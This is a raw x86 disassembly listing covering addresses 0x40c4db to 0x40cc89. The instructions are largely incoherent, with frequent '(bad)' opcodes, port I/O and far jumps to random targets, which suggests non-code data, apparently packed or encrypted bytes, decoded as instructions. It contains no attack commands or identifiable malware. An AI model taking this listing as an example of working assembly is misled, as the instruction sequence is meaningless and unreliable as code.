  40c4db:	or     DWORD PTR [eax+0x3d],edi
  40c4de:	ins    WORD PTR es:[edi],dx
  40c4e0:	push   es
  40c4e1:	je     0x40c4ef
  40c4e3:	inc    ebp
  40c4e4:	pushf  
  40c4e5:	sbb    BYTE PTR [ecx-0x65],dh
  40c4e8:	mov    ds:0x4fe05cd2,ax
  40c4ee:	xchg   edi,eax
  40c4ef:	pop    eax
  40c4f0:	in     eax,0xf2
  40c4f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4f3:	ins    DWORD PTR es:[edi],dx
  40c4f4:	sbb    edi,DWORD PTR es:[ebx]
  40c4f7:	cdq    
  40c4f8:	xor    DWORD PTR [edx+0x116c222d],ecx
  40c4fe:	ficomp DWORD PTR [edx-0x2e61338]
  40c504:	jecxz  0x40c496
  40c506:	out    0x27,eax
  40c508:	jno    0x40c534
  40c50a:	xchg   edx,eax
  40c50b:	adc    eax,0xd5fa23ba
  40c510:	retf   
  40c511:	cmp    eax,0xc0743ae3
  40c516:	or     dh,BYTE PTR [ecx-0x44]
  40c519:	in     eax,dx
  40c51a:	frstor [esi+0x554f228a]
  40c520:	mov    eax,edi
  40c522:	test   BYTE PTR [eax-0xc4e4448],dl
  40c528:	in     al,0xbf
  40c52a:	dec    ebx
  40c52b:	shl    DWORD PTR [ebx+0x2bf38724],cl
  40c531:	jbe    0x40c520
  40c533:	pushf  
  40c534:	mov    dh,0xb3
  40c536:	mov    dl,0x90
  40c538:	fadd   st,st(4)
  40c53a:	nop
  40c53b:	jecxz  0x40c595
  40c53d:	dec    ebp
  40c53e:	mov    edx,0x2174a00e
  40c543:	jbe    0x40c5bb
  40c545:	stos   DWORD PTR es:[edi],eax
  40c546:	add    ecx,DWORD PTR [ebp-0x6d]
  40c549:	stos   BYTE PTR es:[edi],al
  40c54a:	aam    0xc7
  40c54c:	ins    DWORD PTR es:[edi],dx
  40c54d:	fcomp  st(1)
  40c54f:	jbe    0x40c544
  40c551:	push   ss
  40c552:	xlat   BYTE PTR ds:[ebx]
  40c553:	lods   eax,DWORD PTR ds:[esi]
  40c554:	leave  
  40c555:	xor    DWORD PTR [ecx+0xd],esp
  40c558:	scas   eax,DWORD PTR es:[edi]
  40c559:	lahf   
  40c55a:	inc    esp
  40c55b:	(bad)  
  40c55c:	or     DWORD PTR [esi-0x709c12fc],esp
  40c562:	xchg   ebx,eax
  40c563:	loope  0x40c4e6
  40c565:	or     ah,dh
  40c567:	pop    ebx
  40c568:	aad    0x85
  40c56a:	ds test esp,esi
  40c56d:	clc    
  40c56e:	inc    esi
  40c56f:	dec    esi
  40c570:	inc    ebp
  40c571:	jno    0x40c588
  40c573:	aas    
  40c574:	mov    eax,ds:0xc2496792
  40c579:	pop    es
  40c57a:	aad    0x4d
  40c57c:	les    edi,FWORD PTR [edi-0x16925174]
  40c582:	jne    0x40c521
  40c584:	push   ecx
  40c585:	jmp    DWORD PTR [edi-0x3c67717c]
  40c58b:	adc    eax,eax
  40c58d:	cdq    
  40c58e:	ds adc bl,al
  40c591:	ja     0x40c5c5
  40c593:	push   es
  40c594:	add    DWORD PTR [ecx-0x277cc476],esp
  40c59a:	cli    
  40c59b:	push   esp
  40c59c:	and    al,0x45
  40c59e:	cmp    eax,0x5baca73c
  40c5a3:	es pop ebp
  40c5a5:	mov    dh,0x83
  40c5a7:	xchg   edi,eax
  40c5a8:	pop    esi
  40c5a9:	pop    esp
  40c5aa:	ds lahf 
  40c5ac:	popf   
  40c5ad:	sbb    edi,DWORD PTR [ebx+eax*4-0x3d54e57e]
  40c5b4:	daa    
  40c5b5:	pop    ebp
  40c5b6:	push   esp
  40c5b7:	(bad)  [esi-0x54bb0547]
  40c5bd:	stos   DWORD PTR es:[edi],eax
  40c5be:	mov    edi,0x8b2f2b01
  40c5c3:	xor    BYTE PTR [esi-0x6bc493aa],al
  40c5c9:	pop    eax
  40c5ca:	cmp    esi,DWORD PTR [ecx-0x7e6fb169]
  40c5d0:	mov    al,0x86
  40c5d2:	cmp    al,ah
  40c5d4:	rcl    DWORD PTR [ecx+ebp*4],cl
  40c5d7:	repnz test eax,0xf32643e2
  40c5dd:	fs stos DWORD PTR es:[edi],eax
  40c5df:	(bad)  [esp+ecx*1]
  40c5e2:	mov    cl,0x88
  40c5e4:	push   cs
  40c5e5:	(bad)  
  40c5e7:	stc    
  40c5e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5e9:	scas   al,BYTE PTR es:[edi]
  40c5ea:	inc    edx
  40c5eb:	stc    
  40c5ec:	xlat   BYTE PTR ds:[ebx]
  40c5ed:	and    al,BYTE PTR [eax]
  40c5ef:	xchg   ebp,eax
  40c5f0:	mov    al,ah
  40c5f2:	adc    DWORD PTR [edi],eax
  40c5f4:	sbb    eax,0xfa2dc0b4
  40c5f9:	xchg   edi,eax
  40c5fa:	xchg   esp,eax
  40c5fb:	loopne 0x40c5d2
  40c5fd:	add    BYTE PTR [esi+0x2db17130],dh
  40c603:	(bad)  
  40c604:	clc    
  40c605:	add    al,0xe6
  40c607:	retf   
  40c608:	retf   
  40c609:	leave  
  40c60a:	xor    dh,BYTE PTR [ebx+0x39d158f9]
  40c610:	sbb    ebp,DWORD PTR [edi]
  40c612:	fbstp  TBYTE PTR ds:0x60d603aa
  40c618:	pop    ebp
  40c619:	pop    ds
  40c61a:	push   eax
  40c61b:	aad    0x8
  40c61d:	jne    0x40c616
  40c61f:	ret    
  40c620:	ds cmc 
  40c622:	lahf   
  40c623:	ja     0x40c62f
  40c625:	les    ecx,FWORD PTR [ecx]
  40c627:	mov    bl,0x35
  40c629:	adc    al,0x72
  40c62b:	push   esp
  40c62c:	in     eax,0x8
  40c62e:	repz cwde 
  40c630:	cmp    edx,eax
  40c632:	lods   eax,DWORD PTR ds:[esi]
  40c633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c634:	lods   eax,DWORD PTR ds:[esi]
  40c635:	jmp    0x239fd006
  40c63a:	jmp    0x47c4ed63
  40c63f:	inc    eax
  40c640:	adc    DWORD PTR [esi-0x33],0xffffff80
  40c644:	sub    BYTE PTR [ebx-0x16d701f1],cl
  40c64a:	pop    ebx
  40c64b:	loopne 0x40c6c2
  40c64d:	sbb    cl,dh
  40c64f:	mov    ebx,0xfb57bff5
  40c654:	int3   
  40c655:	inc    eax
  40c656:	mov    edx,0x5a9ce652
  40c65b:	icebp  
  40c65c:	cmp    eax,0x56489e29
  40c661:	mov    esp,0x45014c0f
  40c666:	sub    DWORD PTR [ebp-0x2bd29036],ebx
  40c66c:	inc    esp
  40c66d:	imul   ebp,esi,0xffffffac
  40c670:	stos   BYTE PTR es:[edi],al
  40c671:	jp     0x40c64b
  40c673:	call   0xbc052efe
  40c678:	arpl   WORD PTR [esi-0x3e],dx
  40c67b:	cs add bl,cl
  40c67e:	cmp    esp,0xf4827865
  40c684:	scas   al,BYTE PTR es:[edi]
  40c685:	push   cs
  40c686:	pusha  
  40c687:	xor    DWORD PTR [ebp+0x60],edx
  40c68a:	xchg   edi,eax
  40c68b:	xor    cl,BYTE PTR [esi+edx*8]
  40c68e:	jmp    0x21ef6264
  40c693:	out    dx,eax
  40c694:	inc    edx
  40c695:	cmp    al,0x34
  40c697:	mov    bl,0x71
  40c699:	in     al,0xab
  40c69b:	pusha  
  40c69c:	(bad)  
  40c69e:	jmp    0xc379fa7
  40c6a3:	pop    ebx
  40c6a4:	push   eax
  40c6a5:	add    BYTE PTR [ecx],al
  40c6a7:	int3   
  40c6a8:	or     ah,dh
  40c6aa:	stos   DWORD PTR es:[edi],eax
  40c6ab:	test   al,bh
  40c6ad:	adc    al,dl
  40c6af:	adc    BYTE PTR [eax+0x32b435eb],bh
  40c6b5:	sbb    al,0x28
  40c6b7:	dec    edx
  40c6b8:	test   eax,0x192438b1
  40c6bd:	pop    esp
  40c6be:	scas   eax,DWORD PTR es:[edi]
  40c6bf:	dec    esi
  40c6c0:	inc    eax
  40c6c1:	mov    esi,0x7be25278
  40c6c6:	mov    fs,WORD PTR [ebp+0x27]
  40c6c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6ca:	push   cs
  40c6cb:	out    dx,al
  40c6cc:	shr    BYTE PTR [edi-0x64],1
  40c6cf:	mov    dh,0x9
  40c6d1:	aam    0xe6
  40c6d3:	shl    DWORD PTR [edi],0xa0
  40c6d6:	sbb    eax,0x60543602
  40c6db:	div    DWORD PTR [edx+eiz*8+0x476e0cfb]
  40c6e2:	sub    ebp,DWORD PTR [ebp+0x1876442]
  40c6e8:	add    BYTE PTR [esi+0x64e0d41b],bl
  40c6ee:	pop    ebp
  40c6ef:	jecxz  0x40c735
  40c6f1:	outs   dx,DWORD PTR ds:[esi]
  40c6f2:	rol    DWORD PTR [edx+0x7d],1
  40c6f5:	pop    ebx
  40c6f6:	pop    edx
  40c6f7:	xchg   ecx,eax
  40c6f8:	cli    
  40c6f9:	mov    ecx,0xbbe291d4
  40c6fe:	cdq    
  40c6ff:	adc    dh,ch
  40c701:	scas   al,BYTE PTR es:[edi]
  40c702:	addr16 mov dh,0x29
  40c705:	sbb    al,BYTE PTR [ebx+0x705a9b4b]
  40c70b:	dec    edx
  40c70c:	mov    DWORD PTR [edi+0x3a863c1e],ebx
  40c712:	dec    edx
  40c713:	jne    0x40c708
  40c715:	dec    ebp
  40c716:	mov    WORD PTR [esi+0x3a],ss
  40c719:	rcl    BYTE PTR [eax-0x22daaa5],1
  40c71f:	hlt    
  40c720:	in     al,0x5a
  40c722:	sub    BYTE PTR [edi-0x1fa29556],al
  40c728:	ins    DWORD PTR es:[edi],dx
  40c729:	enter  0x68da,0xa5
  40c72d:	(bad)  
  40c72e:	rcl    BYTE PTR [edx],1
  40c730:	test   BYTE PTR [ecx+0x9],0x9a
  40c734:	jae    0x40c6ce
  40c736:	and    esp,edi
  40c738:	mov    ecx,0xbf4875c9
  40c73d:	xor    dl,BYTE PTR [ebx+0x5baa231]
  40c743:	retf   0x3b6a
  40c746:	jmp    DWORD PTR [eax+0x17880520]
  40c74c:	ss popf 
  40c74e:	dec    bx
  40c750:	scas   eax,DWORD PTR es:[edi]
  40c751:	sub    DWORD PTR [esi-0x2c],ebx
  40c754:	or     BYTE PTR [esp+0x7c],al
  40c758:	sbb    al,0xf4
  40c75a:	fistp  DWORD PTR [edi-0x64ee09bf]
  40c760:	add    edx,DWORD PTR [ecx+0x4f]
  40c763:	iret   
  40c764:	pop    edi
  40c765:	add    cl,BYTE PTR [ecx+0x2e]
  40c768:	and    ch,BYTE PTR [edx+0x49]
  40c76b:	sub    eax,0xea6e8861
  40c770:	cmp    edi,ecx
  40c772:	icebp  
  40c773:	push   eax
  40c774:	mov    esi,0xc8d4cc4a
  40c779:	sbb    BYTE PTR [ebx+0x30],dh
  40c77c:	out    dx,eax
  40c77d:	sahf   
  40c77e:	mov    cl,0x28
  40c780:	or     DWORD PTR [esi+eax*4+0x3c],0xffffffa6
  40c785:	xchg   ebx,eax
  40c786:	or     ebp,edi
  40c788:	shl    DWORD PTR [ebx-0x33387c5c],cl
  40c78e:	inc    edi
  40c78f:	or     ah,BYTE PTR [ebp+0x69745434]
  40c795:	add    eax,0xf5873426
  40c79a:	adc    BYTE PTR [eax-0x6c3b155a],ch
  40c7a0:	push   ebp
  40c7a1:	mov    BYTE PTR [esi+edx*8-0x67bb7281],ah
  40c7a8:	mov    WORD PTR [ebx-0x35],fs
  40c7ab:	(bad)  
  40c7ac:	outs   dx,BYTE PTR ds:[esi]
  40c7ad:	mov    ds:0x35379cce,eax
  40c7b2:	jmp    0x40c7e4
  40c7b4:	mov    eax,ds:0x87aef061
  40c7b9:	repnz inc ebp
  40c7bb:	cmp    al,0x8d
  40c7bd:	retf   
  40c7be:	sub    DWORD PTR [ebp-0x2e2598a8],ebx
  40c7c4:	ret    0x84ef
  40c7c7:	sbb    BYTE PTR [ebx],0xa5
  40c7ca:	jmp    0x5c55:0x93f3c16c
  40c7d1:	daa    
  40c7d2:	cwde   
  40c7d3:	clc    
  40c7d4:	ret    
  40c7d5:	adc    eax,0x259d56cf
  40c7da:	mov    ds:0x75d446fe,eax
  40c7df:	int    0x34
  40c7e1:	sub    edx,ebp
  40c7e3:	imul   ebp,DWORD PTR [esp+ecx*2+0x92abad5],0x5b86dd75
  40c7ee:	icebp  
  40c7ef:	and    al,0xa7
  40c7f1:	(bad)  
  40c7f2:	adc    BYTE PTR [edi-0x58],ah
  40c7f5:	call   0xad090db1
  40c7fa:	mov    WORD PTR [edi-0x17],fs
  40c7fd:	jb     0x40c870
  40c7ff:	mov    esi,0xa6e1a186
  40c804:	imul   edx,DWORD PTR [esi],0xffffffb2
  40c807:	jmp    0x85ee:0xec3b2e19
  40c80e:	xchg   edi,eax
  40c80f:	cmp    BYTE PTR [edx],dl
  40c811:	std    
  40c812:	push   esi
  40c813:	xchg   ebp,eax
  40c814:	cmp    eax,edx
  40c816:	test   BYTE PTR [edi],bl
  40c818:	cmc    
  40c819:	jnp    0x40c84e
  40c81b:	mov    al,0xa3
  40c81d:	ret    
  40c81e:	pop    ds
  40c81f:	into   
  40c820:	push   esp
  40c821:	mov    bl,al
  40c823:	fild   DWORD PTR [edi+0x7e948486]
  40c829:	jne    0x40c80f
  40c82b:	imul   ecx,ecx,0x7ad0f542
  40c831:	jge    0x40c86f
  40c833:	xor    eax,0xead6596f
  40c838:	sbb    ch,BYTE PTR [edi+0x4]
  40c83b:	sub    al,BYTE PTR [edi-0x9]
  40c83e:	mov    ecx,esp
  40c840:	(bad)  
  40c842:	loop   0x40c8bf
  40c844:	in     al,dx
  40c845:	ret    
  40c846:	dec    esi
  40c847:	and    dl,BYTE PTR [esi+0x37]
  40c84a:	retf   
  40c84b:	jle    0x40c7da
  40c84d:	jmp    0x43c:0x3209af33
  40c854:	gs jecxz 0x40c82d
  40c857:	push   esp
  40c858:	dec    ecx
  40c859:	xor    eax,DWORD PTR [edi-0xa]
  40c85c:	shl    DWORD PTR [ecx+0x45],0x58
  40c860:	push   ebp
  40c861:	(bad)  
  40c862:	popf   
  40c863:	loope  0x40c8ad
  40c865:	inc    ecx
  40c866:	cwde   
  40c867:	xchg   edi,eax
  40c868:	fild   DWORD PTR [esi]
  40c86a:	cwde   
  40c86b:	in     al,dx
  40c86c:	push   esp
  40c86d:	cwde   
  40c86e:	(bad)  
  40c86f:	in     al,0x3f
  40c871:	add    esi,ecx
  40c873:	add    al,0x58
  40c875:	mov    eax,0x2f8c93cf
  40c87a:	in     eax,dx
  40c87b:	mov    ds:0xb072f3ff,eax
  40c880:	or     BYTE PTR [ebx-0x471f6212],0x8d
  40c887:	dec    edx
  40c888:	sub    al,0x61
  40c88a:	iret   
  40c88b:	das    
  40c88c:	fwait
  40c88d:	sar    BYTE PTR [ebp-0x58ce2e5f],0x27
  40c894:	xchg   ebp,eax
  40c895:	dec    edx
  40c896:	xor    al,0xd
  40c898:	xchg   DWORD PTR [edx],edx
  40c89a:	xchg   edi,eax
  40c89b:	inc    esp
  40c89c:	stos   DWORD PTR es:[edi],eax
  40c89d:	test   DWORD PTR [edx+0x2e],eax
  40c8a0:	sub    BYTE PTR [ebp+0x79],bl
  40c8a3:	sbb    BYTE PTR [edi+ebp*2],ah
  40c8a6:	xor    eax,0x34977829
  40c8ab:	mov    edi,DWORD PTR [eax-0x28]
  40c8ae:	ds push 0xb52d8344
  40c8b4:	js     0x40c842
  40c8b6:	push   ecx
  40c8b7:	in     eax,dx
  40c8b8:	push   esp
  40c8b9:	jle    0x40c8a5
  40c8bb:	cmp    bl,dh
  40c8bd:	dec    eax
  40c8be:	xor    BYTE PTR [eax],dl
  40c8c0:	mov    edx,0x1f851190
  40c8c5:	imul   ebp,DWORD PTR [ecx+0x3ec16701],0xb609b0e6
  40c8cf:	adc    al,0xf6
  40c8d1:	mov    es,WORD PTR [ebp-0xc67649f]
  40c8d7:	cmp    ecx,DWORD PTR fs:[edi]
  40c8da:	mov    al,ds:0xb5710f2e
  40c8df:	clc    
  40c8e0:	popa   
  40c8e1:	push   es
  40c8e2:	or     BYTE PTR [esi-0x435f2e65],bh
  40c8e8:	dec    ebp
  40c8e9:	mov    ebx,0xe40b7be6
  40c8ee:	adc    BYTE PTR [edx-0x6d358db5],ah
  40c8f4:	aam    0x80
  40c8f6:	sbb    dh,BYTE PTR [edi]
  40c8f8:	mov    dh,0x7e
  40c8fa:	jmp    0x595a:0xd794c074
  40c901:	xor    al,0x8f
  40c903:	push   edx
  40c904:	scas   al,BYTE PTR es:[edi]
  40c905:	ret    
  40c906:	inc    ebp
  40c907:	adc    al,0x45
  40c909:	enter  0xa8e1,0x34
  40c90d:	ret    0x4a13
  40c910:	cwde   
  40c911:	mov    edi,0x3ee9122a
  40c916:	mov    ah,0x96
  40c918:	or     BYTE PTR ds:0x39e5389d,ah
  40c91e:	(bad)  
  40c91f:	mov    DWORD PTR [edx+0x4bcf6e9c],ecx
  40c925:	mov    bh,0xfc
  40c927:	mov    esp,0x1f7543e0
  40c92c:	lea    eax,[ecx-0x4caed8e7]
  40c932:	or     al,0x7d
  40c934:	cdq    
  40c935:	out    0xeb,eax
  40c937:	push   esp
  40c938:	cmp    DWORD PTR [edx+0x11],0xffffffe7
  40c93c:	inc    edi
  40c93d:	daa    
  40c93e:	mov    esp,DWORD PTR [eax-0x4a]
  40c941:	pop    eax
  40c942:	jne    0x40c9bf
  40c944:	in     eax,0x3d
  40c946:	xor    eax,0xd2c8cd81
  40c94b:	xor    BYTE PTR [ebx+ebp*8-0x6c],dl
  40c94f:	cld    
  40c950:	js     0x40c9ca
  40c952:	inc    eax
  40c953:	inc    DWORD PTR [edi]
  40c955:	mov    al,0x52
  40c957:	cmp    esp,eax
  40c959:	adc    eax,esi
  40c95b:	(bad)
  40c95e:	pop    eax
  40c95f:	mov    ebx,0xbfa72c4
  40c964:	or     DWORD PTR [eax-0xd],ecx
  40c967:	push   ds
  40c968:	loope  0x40c9ce
  40c96a:	inc    eax
  40c96b:	pop    es
  40c96c:	fbld   TBYTE PTR [eax+0x19]
  40c96f:	aad    0x20
  40c971:	xor    ebp,DWORD PTR [eax]
  40c973:	cmp    al,dl
  40c975:	test   BYTE PTR [esi],al
  40c977:	shr    BYTE PTR [ebx+0x5d],1
  40c97a:	rcr    DWORD PTR [ebx-0x2a1efb7a],1
  40c980:	xchg   ebx,eax
  40c981:	jge    0x40c979
  40c983:	pop    es
  40c984:	jb     0x40c997
  40c986:	rcr    DWORD PTR [esi+0x19],cl
  40c989:	dec    edi
  40c98a:	cmp    al,0x90
  40c98c:	loopne 0x40c936
  40c98e:	jge    0x40c94e
  40c990:	pushf  
  40c991:	enter  0xba5b,0xb5
  40c995:	push   es
  40c996:	sbb    edx,DWORD PTR [ebx-0x6b]
  40c999:	loopne 0x40c9f9
  40c99b:	stos   BYTE PTR es:[edi],al
  40c99c:	mov    eax,ds:0x731f21d7
  40c9a1:	pop    DWORD PTR ds:0x29f8ed7
  40c9a7:	jg     0x40ca08
  40c9a9:	sar    BYTE PTR [edi-0x654aefdc],cl
  40c9af:	or     BYTE PTR [edi],0xb7
  40c9b2:	out    0x60,eax
  40c9b4:	pop    ebx
  40c9b5:	and    dh,BYTE PTR [edx-0x55]
  40c9b8:	jae    0x40c94a
  40c9ba:	push   0x62e55b4
  40c9bf:	mov    ecx,0x86ea8c37
  40c9c4:	loopne 0x40c9ba
  40c9c6:	shr    BYTE PTR ds:0x697de6f,cl
  40c9cc:	mov    ebx,DWORD PTR [esp+eiz*4]
  40c9cf:	(bad)  
  40c9d1:	mov    eax,ds:0xfba309c1
  40c9d6:	test   DWORD PTR [edx],0xa9e36da9
  40c9dc:	retf   0xd15
  40c9df:	and    eax,DWORD PTR [ebp+0x19]
  40c9e2:	ins    DWORD PTR es:[edi],dx
  40c9e3:	dec    ebx
  40c9e4:	imul   BYTE PTR [edx]
  40c9e6:	test   eax,0x6d3ec75b
  40c9eb:	mov    bh,BYTE PTR [esi+0x54]
  40c9ee:	fwait
  40c9ef:	mov    eax,0x65e64ea1
  40c9f4:	pop    edx
  40c9f5:	mov    esp,0xf5d5a06c
  40c9fa:	stc    
  40c9fb:	popf   
  40c9fc:	mov    ch,0xe9
  40c9fe:	add    al,0x76
  40ca00:	cs in  al,dx
  40ca02:	push   edx
  40ca03:	lahf   
  40ca04:	es cld 
  40ca06:	pusha  
  40ca07:	cmp    BYTE PTR [edx+esi*8-0x27f59ae],bl
  40ca0e:	mov    dl,0xf5
  40ca10:	pop    ds
  40ca11:	imul   edx,DWORD PTR [edx-0x18],0x4ead9f13
  40ca18:	inc    edi
  40ca19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca1a:	jmp    0x90b1:0x8c8ae8ed
  40ca21:	or     al,BYTE PTR [ecx+0x75]
  40ca24:	cli    
  40ca25:	mov    bl,0x3c
  40ca27:	inc    edx
  40ca28:	dec    eax
  40ca29:	sub    dh,BYTE PTR [eax-0x57fcfbb0]
  40ca2f:	push   0x8270600
  40ca34:	cmp    esp,ebx
  40ca36:	out    dx,al
  40ca37:	fsub   DWORD PTR [edi+0x76eabb43]
  40ca3d:	inc    esp
  40ca3e:	retf   0x1e28
  40ca41:	test   eax,0x52667652
  40ca46:	mov    al,0x99
  40ca48:	and    ah,cl
  40ca4a:	not    BYTE PTR [esi-0x2088f529]
  40ca50:	mov    edi,0x8d90a3a4
  40ca55:	sub    dl,al
  40ca57:	or     eax,0x95c11093
  40ca5c:	mov    dl,0x94
  40ca5e:	pop    edx
  40ca5f:	pop    ebp
  40ca60:	inc    esp
  40ca61:	xchg   ebx,eax
  40ca62:	rcl    BYTE PTR [edx+0x7c0f8242],1
  40ca68:	test   esp,esp
  40ca6a:	push   edx
  40ca6b:	repnz cld 
  40ca6d:	scas   al,BYTE PTR es:[edi]
  40ca6e:	push   0xe2616a04
  40ca73:	add    eax,0xaad1649f
  40ca78:	mov    esi,0x4648c4d2
  40ca7d:	faddp  st(3),st
  40ca7f:	inc    eax
  40ca80:	out    0x55,al
  40ca82:	sub    BYTE PTR ds:0xb130cfc9,bl
  40ca88:	sti    
  40ca89:	clc    
  40ca8a:	in     al,dx
  40ca8b:	dec    ebp
  40ca8c:	cwde   
  40ca8d:	ss repnz push ds
  40ca90:	sub    eax,0xe3e0a994
  40ca95:	pop    ss
  40ca96:	sub    DWORD PTR [edi+0x29],ebp
  40ca99:	mov    ds:0x22180de2,al
  40ca9e:	mov    cl,0x22
  40caa0:	xor    ebx,ebp
  40caa2:	idiv   DWORD PTR [edx+0x25cd1cf]
  40caa8:	cmp    ebx,DWORD PTR [ebx+0x75006c48]
  40caae:	mov    bh,0x7
  40cab0:	jnp    0x40ca9e
  40cab2:	xchg   edx,eax
  40cab3:	xchg   esp,eax
  40cab4:	push   esp
  40cab5:	jmp    0xc4f3:0xd5f9b7ef
  40cabc:	ds push esp
  40cabe:	lods   eax,DWORD PTR ds:[esi]
  40cabf:	adc    eax,0xfc99fe63
  40cac4:	sbb    al,0xba
  40cac6:	sbb    esp,DWORD PTR [edx]
  40cac8:	iret   
  40cac9:	pop    edx
  40caca:	sub    eax,0xbd492321
  40cacf:	js     0x40ca5c
  40cad1:	loope  0x40ca9e
  40cad3:	mov    ch,0xe2
  40cad5:	mov    eax,0xb21bc8c8
  40cada:	mov    al,ds:0x85b174cc
  40cadf:	or     ecx,DWORD PTR ds:0x2088ccd1
  40cae5:	int3   
  40cae6:	imul   ebp,DWORD PTR [edi-0x75],0x227aa0a9
  40caed:	or     eax,DWORD PTR ds:0xc40e0030
  40caf3:	add    eax,0x6e3c24a9
  40caf8:	call   0x53aa02a2
  40cafd:	add    eax,0xa077d826
  40cb02:	out    dx,al
  40cb03:	and    dl,bh
  40cb05:	retf   0x2e0d
  40cb08:	push   es
  40cb09:	inc    ebx
  40cb0a:	mov    al,0xb7
  40cb0c:	pushf  
  40cb0d:	ja     0x40cae7
  40cb0f:	inc    ecx
  40cb10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb11:	adc    dl,ah
  40cb13:	mov    eax,ds:0x90d7e666
  40cb18:	mov    ds:0x5a36e919,eax
  40cb1d:	lds    edx,FWORD PTR ds:0xcb9f5cef
  40cb23:	out    dx,al
  40cb24:	std    
  40cb25:	pop    ebp
  40cb26:	cs push eax
  40cb28:	rol    BYTE PTR [ebx],cl
  40cb2a:	pop    edx
  40cb2b:	call   0xddb2ae5c
  40cb30:	shl    DWORD PTR [esi],cl
  40cb32:	int    0xb6
  40cb34:	cmp    eax,0x3b4c690b
  40cb39:	test   BYTE PTR [eax-0x55d63e7e],al
  40cb3f:	mov    ds:0xc1bfcb9e,al
  40cb44:	ds dec ecx
  40cb46:	lods   eax,DWORD PTR ds:[esi]
  40cb47:	je     0x40cb61
  40cb49:	in     eax,dx
  40cb4a:	or     bh,BYTE PTR [esi+0x66276bd]
  40cb50:	arpl   WORD PTR [edi+0x4cc1b163],si
  40cb56:	sub    BYTE PTR [eax],ch
  40cb58:	push   0x9bf7f78a
  40cb5d:	xor    DWORD PTR [eax],ebp
  40cb5f:	push   edi
  40cb60:	jno    0x40cb6c
  40cb62:	jge    0x40cb91
  40cb64:	mov    dl,0xa9
  40cb66:	mul    ah
  40cb68:	enter  0xb5b0,0xa0
  40cb6c:	imul   DWORD PTR ds:0x6c076114
  40cb72:	mov    ah,0xd6
  40cb74:	xchg   ebx,eax
  40cb75:	push   0x7d10e2a1
  40cb7a:	mov    ebx,0x8b779fba
  40cb7f:	adc    bl,0x81
  40cb82:	xor    eax,0xf77b0c1
  40cb87:	nop
  40cb88:	cmc    
  40cb89:	aas    
  40cb8a:	push   es
  40cb8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb8c:	ror    ebx,0x1
  40cb8f:	jg     0x40cb7f
  40cb91:	jo     0x40cb4d
  40cb93:	mov    eax,ds:0x16e28b27
  40cb98:	inc    DWORD PTR [eax-0x6d2f1c90]
  40cb9e:	adc    BYTE PTR [ecx+esi*2-0x18985568],al
  40cba5:	adc    BYTE PTR [eax+eax*1-0x59],bh
  40cba9:	mov    edx,0xc8d69f82
  40cbae:	aas    
  40cbaf:	cmp    cl,BYTE PTR [ecx-0x5fa6da90]
  40cbb5:	das    
  40cbb6:	inc    eax
  40cbb7:	outs   dx,DWORD PTR ds:[esi]
  40cbb8:	or     ah,BYTE PTR [esi]
  40cbba:	inc    esp
  40cbbb:	pop    edx
  40cbbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbbd:	sbb    esp,ecx
  40cbbf:	data16 xor cl,BYTE PTR [eax]
  40cbc2:	dec    ecx
  40cbc3:	mov    dl,0x4a
  40cbc5:	mov    WORD PTR [ecx+0x2be3b711],?
  40cbcb:	mov    edi,0xfe7c88d0
  40cbd0:	inc    ebx
  40cbd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbd2:	popa   
  40cbd3:	in     eax,0x81
  40cbd5:	jmp    0x40cb90
  40cbd7:	xlat   BYTE PTR ds:[ebx]
  40cbd8:	inc    esi
  40cbd9:	and    DWORD PTR [eax-0x67],ebx
  40cbdc:	in     al,dx
  40cbdd:	mov    ds:0x6bbbd889,al
  40cbe2:	pop    ss
  40cbe3:	inc    edi
  40cbe4:	outs   dx,DWORD PTR ds:[esi]
  40cbe5:	jnp    0x40cc52
  40cbe7:	inc    ecx
  40cbe8:	xchg   esi,eax
  40cbe9:	je     0x40cbc0
  40cbeb:	mov    ds:0xba66d5f4,eax
  40cbf0:	push   edx
  40cbf1:	sub    BYTE PTR [esi+0x55a2a595],bh
  40cbf7:	push   esi
  40cbf8:	pop    edx
  40cbf9:	fst    QWORD PTR [ebp+edi*4+0x72c3b7bf]
  40cc00:	jmp    0x908e9b43
  40cc05:	call   0xc85cef5c
  40cc0a:	ret    
  40cc0b:	mov    al,ds:0x8f3a5119
  40cc10:	imul   ebp,DWORD PTR [edi],0x4ddc6e72
  40cc16:	int    0x3f
  40cc18:	sbb    DWORD PTR [ecx],edx
  40cc1a:	imul   ecx,ebp,0xd9966f91
  40cc20:	test   ecx,eax
  40cc22:	sbb    esp,ebp
  40cc24:	repz (bad) 
  40cc26:	aam    0xa3
  40cc28:	mov    fs,WORD PTR [eax]
  40cc2a:	mov    ecx,gs
  40cc2c:	outs   dx,BYTE PTR ds:[esi]
  40cc2d:	pop    ss
  40cc2e:	xor    eax,0x353b0d26
  40cc33:	dec    eax
  40cc34:	mov    ds:0x43d2ecdf,eax
  40cc39:	ss inc ecx
  40cc3b:	inc    ecx
  40cc3c:	shl    BYTE PTR [ebx],1
  40cc3e:	repnz shl DWORD PTR [edx],cl
  40cc41:	mov    al,0xc9
  40cc43:	sbb    BYTE PTR [ebx+0x52],dh
  40cc46:	mov    eax,0xfbd2629e
  40cc4b:	jl     0x40cc35
  40cc4d:	pushf  
  40cc4e:	dec    edi
  40cc4f:	jp     0x40cc35
  40cc51:	mov    DWORD PTR [edi],0xa46fa92
  40cc57:	js     0x40cccc
  40cc59:	jb     0x40cbe1
  40cc5b:	retf   
  40cc5c:	mov    edx,0x8ca57067
  40cc61:	dec    eax
  40cc62:	or     al,0x6b
  40cc64:	shr    DWORD PTR [ebx+0x2eda5128],0x3b
  40cc6b:	mov    eax,0x61b1cb4e
  40cc70:	adc    DWORD PTR [eax],0xffffffbe
  40cc73:	inc    eax
  40cc74:	cmp    DWORD PTR [edx+0x39b4a082],0xffffffb0
  40cc7b:	inc    edi
  40cc7c:	push   edi
  40cc7d:	in     al,0x5c
  40cc7f:	pop    es
  40cc80:	neg    DWORD PTR [ecx+0x58822483]
  40cc86:	push   ebp
  40cc87:	fisubr WORD PTR [eax]
  40cc89:	push   ds
